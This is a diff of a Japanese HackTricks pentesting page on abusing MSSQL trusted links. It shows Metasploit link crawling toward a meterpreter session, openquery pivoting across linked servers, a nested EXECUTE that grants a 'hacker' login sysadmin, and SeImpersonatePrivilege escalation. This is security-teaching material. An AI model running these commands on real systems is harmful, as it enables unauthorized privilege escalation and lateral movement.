@@ -2,13 +2,13 @@
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
 * **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
+* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)に参加**または[Telegramグループ](https://t.me/peass)に参加し、**Twitter**で私をフォロー🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。
 
 </details>
 
@@ -80,7 +80,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL信頼されたリンク
 
-もしMSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合、ユーザーが信頼されたデータベースに権限を持っている場合、**信頼関係を使用して他のインスタンスでもクエリを実行することができます**。これらの信頼関係は連鎖することができ、ユーザーはいくつかの構成ミスがあるデータベースを見つけてコマンドを実行することができるかもしれません。
+もしMSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合、ユーザーが信頼されたデータベースに権限を持っている場合、**信頼関係を使用して他のインスタンスでもクエリを実行できる**ようになります。この信頼関係は連鎖することができ、ユーザーはいくつかの構成ミスがあるデータベースを見つけてコマンドを実行できるかもしれません。
 
 **データベース間のリンクは、フォレストトラストを超えて機能します。**
 
@@ -124,6 +124,8 @@ Metasploitを使用して簡単に信頼されたリンクをチェックでき�
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
+metasploitはMSSQLの`openquery()`関数のみを悪用しようとします（つまり、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動**で試す必要があります。詳細は以下を参照してください。）
+
 ### 手動 - Openquery()
 
 **Linux**からは、**sqsh**と**mssqlclient.py**を使用してMSSQLコンソールシェルを取得できます。
@@ -133,19 +135,22 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 _Windows認証を使用してログイン:_
 
 ![](<../../.gitbook/assets/image (167) (1).png>)
+
+#### 信頼できるリンクの検索
 ```sql
-select * from master..sysservers
+select * from master..sysservers;
+EXEC sp_linkedservers;
 ```
 ![](<../../.gitbook/assets/image (168).png>)
 
-#### 信頼できるリンクでクエリを実行する
+#### 信頼できるリンクでクエリを実行
 
 リンクを介してクエリを実行します（例：新しいアクセス可能なインスタンスでより多くのリンクを見つける）：
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-二重引用符と単一引用符の使用箇所を確認してください。その方法で使用することが重要です。
+二重引用符と単一引用符の使用方法を確認してください。それをその方法で使用することが重要です。
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (169).png>)
@@ -170,6 +175,6 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。
 
-多くの著者が考え出した戦略は、SYSTEMサービスを強制して、攻撃者が作成したローグまたは中間者サービスに認証させることです。このローグサービスは、SYSTEMサービスが認証しようとしている間にSYSTEMサービスを偽装することができます。
+多くの著者が考案した戦略は、SYSTEMサービスを、攻撃者が作成したローグまたは中間者サービスに認証させることです。このローグサービスは、SYSTEMサービスが認証しようとしている間にSYSTEMサービスを偽装することができます。
 
 [SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまなテクニックが収録されています。
